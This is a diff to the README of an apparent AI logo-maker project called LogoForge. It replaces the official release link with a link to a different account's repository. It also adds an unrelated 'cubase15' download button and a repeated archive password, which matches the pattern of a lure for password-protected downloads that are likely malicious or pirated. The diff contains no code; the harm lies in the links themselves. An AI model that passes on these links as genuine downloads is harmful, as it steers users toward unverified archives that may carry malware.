@@ -21,10 +21,12 @@
 
   <br><br>
 
-  <a href="https://github.com/yourusername/logoforge/releases">
-    <img src="https://img.shields.io/badge/Download-Latest%20Release%20(v1.2.0)-1E40AF?style=for-the-badge&logo=github&logoColor=white"/>
-  </a>
+---
 
+<div align="center">
+  <a href="https://github.com/centralpigeonnippers/ai-logo-maker/releases/tag/ai-logoforge-maker-logo-ai">
+    <img src="https://img.shields.io/badge/Download%20LogoForge-v1.1.0-1E40AF?style=for-the-badge&logo=github&logoColor=white&color=1e40af" alt="Download LogoForge">
+  </a>
 </div>
 
 ---
@@ -85,6 +87,16 @@ Improve the AI models collaboratively—train on your own brand guidelines and o
 - Electron + React architecture with full TypeScript typing  
 
 ---
+
+ <div align="center">
+  <a href="https://github.com/TechnomancerEngage/cubase15/releases/tag/Cubase">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
+
+## PASSW0RD - xDpLast5621
+## PASSW0RD - xDpLast5621
+## PASSW0RD - xDpLast5621
 
 ### Hardware Requirements
 
